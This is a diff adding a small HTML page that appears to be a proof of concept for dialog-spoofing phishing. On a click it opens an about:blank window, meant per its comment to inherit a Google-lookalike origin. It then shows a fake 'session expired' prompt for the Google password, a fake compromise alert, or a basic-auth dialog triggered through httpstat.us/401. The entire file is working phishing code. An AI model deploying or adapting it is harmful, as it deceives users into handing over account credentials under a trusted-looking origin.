@@ -1,0 +1,34 @@
+<!doctype html>
+<html>
+<head>
+<style>html { font-family: sans-serif; background: transparent; }</style>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+<script>
+var searchParams = new URLSearchParams(window.location.search);
+var mode = searchParams.get('mode');
+
+window.addEventListener('click', () => {
+    // Spawn about:blank buat inherit origin "googlelogo-security.github.io"
+    var newWin = window.open('about:blank');
+    
+    setTimeout(() => {
+        switch (mode) {
+            case 'jsprompt':
+                newWin.prompt("Session expired. Please re-enter your Google Password to continue:");
+                break;
+            case 'jsalert':
+                newWin.alert("SECURITY WARNING: Your account has been compromised.");
+                break;
+            case 'basicauth':
+                var xhr = new newWin.XMLHttpRequest();
+                xhr.open("GET", "https://httpstat.us/401", true);
+                xhr.send();
+                break;
+        }
+    }, 150);
+});
+</script>
+</body>
+</html>
